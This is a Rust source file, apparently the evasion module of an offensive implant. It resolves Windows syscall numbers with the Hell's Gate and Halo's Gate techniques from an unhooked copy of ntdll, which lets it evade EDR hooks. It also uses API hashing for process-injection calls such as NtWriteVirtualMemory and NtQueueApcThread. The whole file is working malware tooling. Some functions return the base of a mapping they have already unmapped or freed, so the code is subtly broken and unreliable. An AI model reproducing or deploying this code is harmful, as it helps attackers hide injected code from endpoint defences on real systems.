// SSN resolution — mirror of Go agent/internal/win/ssn.go + clean_ntdll.go.
// Hell's Gate dynamic SSN extraction with Halo's Gate fallback, sourced from a
// clean ntdll (\KnownDlls section first, then on-disk DONT_RESOLVE_DLL_REFERENCES)
// so post-boot EDR hooks cannot corrupt the numbers.

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]

use crate::evasion::pe::*;
use std::collections::HashMap;
use std::sync::OnceLock;

// FNV-1a hashes of the NT APIs the evasion layer resolves (no import table).
pub const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xca67b978;
pub const HASH_NT_FREE_VIRTUAL_MEMORY: u32 = 0xb51cc567;
pub const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0xbd799926;
pub const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x43e32f32;
pub const HASH_NT_CREATE_THREAD_EX: u32 = 0xed0594da;
pub const HASH_NT_QUEUE_APC_THREAD: u32 = 0xb10f026c;
pub const HASH_NT_RESUME_THREAD: u32 = 0xe06437fc;
pub const HASH_NT_OPEN_PROCESS: u32 = 0x5ea49a38;
pub const HASH_NT_DELAY_EXECUTION: u32 = 0xd856e554;
pub const HASH_NT_CREATE_SECTION: u32 = 0x3c59f362;
pub const HASH_NT_MAP_VIEW_OF_SECTION: u32 = 0xcbc9e1ae;
pub const HASH_NT_UNMAP_VIEW_OF_SECTION: u32 = 0x53b808c5;
pub const HASH_NT_OPEN_SECTION: u32 = 0x14858576;
pub const HASH_NT_OPEN_FILE: u32 = 0x7042a37d;
pub const HASH_NT_CLOSE: u32 = 0x6b372c05;
pub const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0xb073c52e;

#[derive(Clone, Copy)]
pub struct SsnEntry {
    pub name: &'static str,
    pub ssn: usize,
    pub gadget: usize, // ntdll syscall;ret gadget
}

static SSN_TABLE: OnceLock<HashMap<u32, SsnEntry>> = OnceLock::new();

/// Read `n` bytes at a pointer.
pub unsafe fn peek(p: usize, n: usize) -> Vec<u8> {
    std::slice::from_raw_parts(p as *const u8, n).to_vec()
}

/// Hell's Gate heuristic: find `mov eax, imm32` (0xB8) whose value is plausible
/// and followed by `syscall` (0F 05) within 21 bytes (wow64-aware stubs have a
/// conditional in between). `mod_end` bounds the read.
fn find_ssn(stub: usize, mod_end: usize) -> Option<usize> {
    if stub == 0 || stub + 32 > mod_end {
        return None;
    }
    unsafe {
        let b = peek(stub, 32);
        let mut i = 0;
        while i + 7 < b.len() {
            if b[i] != 0xB8 {
                i += 1;
                continue;
            }
            let ssn = u32::from_le_bytes(b[i+1..i+5].try_into().unwrap());
            if ssn > 0x2000 {
                i += 1;
                continue;
            }
            let mut j = i + 5;
            let limit = (i + 21).min(b.len() - 1);
            while j < limit {
                if b[j] == 0x0F && b[j+1] == 0x05 {
                    return Some(ssn as usize);
                }
                j += 1;
            }
            i += 1;
        }
    }
    None
}

/// Parse a module's exports into an SSN table keyed by name hash. `ntdll_base`
/// may be the live module or a clean mapping (KnownDlls / disk).
fn parse_ntdll(ntdll: usize, gadget: usize) -> HashMap<u32, SsnEntry> {
    let mut table = HashMap::new();
    unsafe {
        let (nt, mod_end) = match nt_headers_opt(ntdll) {
            Some(v) => v,
            None => return table,
        };
        let end = ntdll + mod_end;
        let edir = &(*nt).optional_header.data_directory[0];
        if edir.virtual_address == 0 {
            return table;
        }
        let exp = (ntdll + edir.virtual_address as usize) as *const ImageExportDirectory;
        let n_names = (*exp).number_of_names as usize;
        let n_funcs = (*exp).number_of_functions as usize;
        if n_names == 0 || n_funcs == 0 {
            return table;
        }
        let names = (ntdll + (*exp).address_of_names as usize) as *const u32;
        let ords = (ntdll + (*exp).address_of_name_ordinals as usize) as *const u16;
        let funcs = (ntdll + (*exp).address_of_functions as usize) as *const u32;

        // First pass: extract SSNs by ordinal.
        let mut by_index: HashMap<usize, usize> = HashMap::new();
        for i in 0..n_names {
            let ord = *ords.add(i) as usize;
            if ord >= n_funcs {
                continue;
            }
            let stub = ntdll + *funcs.add(ord) as usize;
            if let Some(ssn) = find_ssn(stub, end) {
                by_index.insert(ord, ssn);
            }
        }
        // Halo's Gate: ordinals missing an SSN get nearest lower + offset.
        for ord in 0..n_funcs {
            if by_index.contains_key(&ord) {
                continue;
            }
            let mut base = 0usize;
            let mut steps = 0usize;
            let mut j = ord as isize - 1;
            while j >= 0 {
                steps += 1;
                if let Some(v) = by_index.get(&(j as usize)) {
                    base = v + steps;
                    break;
                }
                j -= 1;
            }
            by_index.insert(ord, base);
        }

        // Build name→entry map for Nt* exports.
        for i in 0..n_names {
            let ord = *ords.add(i) as usize;
            if ord >= n_funcs {
                continue;
            }
            let name_ptr = ntdll + *names.add(i) as usize;
            if name_ptr >= end {
                continue;
            }
            let name = c_string(name_ptr, end);
            if name.len() > 2 && name.starts_with("Nt") {
                let key = hash_ansi(&name);
                // Box the name string so the entry is 'static.
                let leaked: &'static str = Box::leak(name.into_boxed_str());
                table.insert(key, SsnEntry {
                    name: leaked,
                    ssn: *by_index.get(&ord).unwrap_or(&0),
                    gadget,
                });
            }
        }
    }
    table
}

/// Bounds-checked NT headers (shared helper).
unsafe fn nt_headers_opt(base: usize) -> Option<(*const ImageNtHeaders64, usize)> {
    if base == 0 {
        return None;
    }
    let dos = base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D {
        return None;
    }
    let nt = (base + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x0000_4550 {
        return None;
    }
    Some((nt, (*nt).optional_header.size_of_image as usize))
}

// ---- clean ntdll sources ----

#[repr(C)]
struct ObjectAttributes64 {
    length: u32,
    _pad: [u8; 4],
    root_dir: usize,
    obj_name: usize, // *UNICODE_STRING
    attributes: u32,
    _pad2: [u8; 4],
    sec_desc: usize,
    sec_qos: usize,
}

#[repr(C)]
struct UnicodeString64 {
    length: u16,
    max_length: u16,
    _pad: u32,
    buffer: usize,
}

const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const SECTION_MAP_READ: u32 = 0x0004;

// Resolved via export cache (IAT-free).
fn resolve_export(module: usize, name: &str) -> usize {
    get_export(module, hash_ansi(name))
}

/// Map the \KnownDlls\ntdll.dll section (read-only) and parse it. Returns the
/// SSN table if it produced any entries.
fn map_known_dlls_ntdll() -> Option<usize> {
    unsafe {
        let ntdll = module_ntdll();
        if ntdll == 0 {
            return None;
        }
        let open_section = resolve_export(ntdll, "NtOpenSection");
        let map_view = resolve_export(ntdll, "NtMapViewOfSection");
        let unmap_view = resolve_export(ntdll, "NtUnmapViewOfSection");
        let close = resolve_export(ntdll, "NtClose");
        if open_section == 0 || map_view == 0 || unmap_view == 0 || close == 0 {
            return None;
        }
        let path: Vec<u16> = "\\KnownDlls\\ntdll.dll".encode_utf16().collect();
        let ustr = UnicodeString64 {
            length: ((path.len()) * 2) as u16,
            max_length: ((path.len()) * 2 + 2) as u16,
            _pad: 0,
            buffer: path.as_ptr() as usize,
        };
        let oa = ObjectAttributes64 {
            length: 48,
            _pad: [0; 4],
            root_dir: 0,
            obj_name: &ustr as *const _ as usize,
            attributes: OBJ_CASE_INSENSITIVE,
            _pad2: [0; 4],
            sec_desc: 0,
            sec_qos: 0,
        };
        let mut h_section: usize = 0;
        // NtOpenSection(OUT PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES) — 3 args.
        let st = call_api(open_section, &mut h_section as *mut _ as usize, SECTION_MAP_READ as usize, &oa as *const _ as usize, 0, 0, 0);
        if (st as i32) < 0 {
            return None;
        }
        let mut base: usize = 0;
        let mut size: usize = 0;
        let st2 = call_api(
            map_view,
            h_section,
            usize::MAX,
            &mut base as *mut _ as usize,
            0,
            0,
            &mut size as *mut _ as usize,
        );
        let _ = call_api(close, h_section, 0, 0, 0, 0, 0);
        if (st2 as i32) < 0 {
            return None;
        }
        if *(base as *const u16) != 0x5A4D {
            let _ = call_api(unmap_view, usize::MAX, base, 0, 0, 0, 0);
            return None;
        }
        let _ = call_api(unmap_view, usize::MAX, base, 0, 0, 0, 0);
        Some(base)
    }
}

/// Load ntdll from disk with DONT_RESOLVE_DLL_REFERENCES, parse, unload.
fn map_ntdll_from_disk() -> Option<usize> {
    unsafe {
        let ntdll = module_ntdll();
        if ntdll == 0 {
            return None;
        }
        let loadlib = resolve_export(module_kernel32(), "LoadLibraryExW");
        let freelib = resolve_export(module_kernel32(), "FreeLibrary");
        if loadlib == 0 || freelib == 0 {
            return None;
        }
        let root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into());
        let path: Vec<u16> = format!("{}\\System32\\ntdll.dll", root).encode_utf16().collect();
        // LoadLibraryExW(lpFileName, hFile, dwFlags=1 DONT_RESOLVE_DLL_REFERENCES)
        let h = call_api(loadlib, path.as_ptr() as usize, 0, 1, 0, 0, 0);
        if h == 0 {
            return None;
        }
        let base = h;
        let _ = call_api(freelib, h, 0, 0, 0, 0, 0);
        Some(base)
    }
}

/// Call a resolved API with up to 6 args (L1 path, no IAT). a6 is passed on
/// the stack per the x64 ABI.
#[inline]
pub unsafe fn call_api(proc: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "sub rsp, 0x30",
        "mov [rsp+0x28], {a5}",
        "mov [rsp+0x30], {a6}",
        "mov r10, rcx",
        "call {proc}",
        "add rsp, 0x30",
        proc = in(reg) proc,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") ret,
        options(nostack)
    );
    ret
}

/// Ensure the SSN table is resolved (once). Prefers clean sources.
pub fn ensure_ssns() {
    let _ = table();
}

/// Get (and lazily build) the SSN table.
pub fn table() -> &'static HashMap<u32, SsnEntry> {
    SSN_TABLE.get_or_init(|| {
        let ntdll = module_ntdll();
        let gadget = {
            let ntdll = module_ntdll();
            if ntdll == 0 {
                0
            } else {
                unsafe {
                    let (nt, _) = nt_headers_opt(ntdll).unwrap_or((std::ptr::null(), 0));
                    if nt.is_null() {
                        0
                    } else {
                        let size = (*nt).optional_header.size_of_image as usize;
                        crate::evasion::syscall::find_syscall_gadget(ntdll, size)
                    }
                }
            }
        };
        // Try clean sources first.
        let mut table = if let Some(base) = map_known_dlls_ntdll() {
            let t = parse_ntdll(base, gadget);
            if !t.is_empty() {
                t
            } else if let Some(d) = map_ntdll_from_disk() {
                parse_ntdll(d, gadget)
            } else {
                parse_ntdll(ntdll, gadget)
            }
        } else if let Some(d) = map_ntdll_from_disk() {
            let t = parse_ntdll(d, gadget);
            if !t.is_empty() {
                t
            } else {
                parse_ntdll(ntdll, gadget)
            }
        } else {
            parse_ntdll(ntdll, gadget)
        };
        if table.is_empty() {
            // Last resort: live ntdll.
            table = parse_ntdll(ntdll, gadget);
        }
        table
    })
}

/// Look up an SSN by name hash.
pub fn ssn(hash: u32) -> Option<SsnEntry> {
    table().get(&hash).copied()
}

/// Look up an SSN by export name.
pub fn ssn_by_name(name: &str) -> Option<SsnEntry> {
    table().get(&hash_ansi(name)).copied()
}
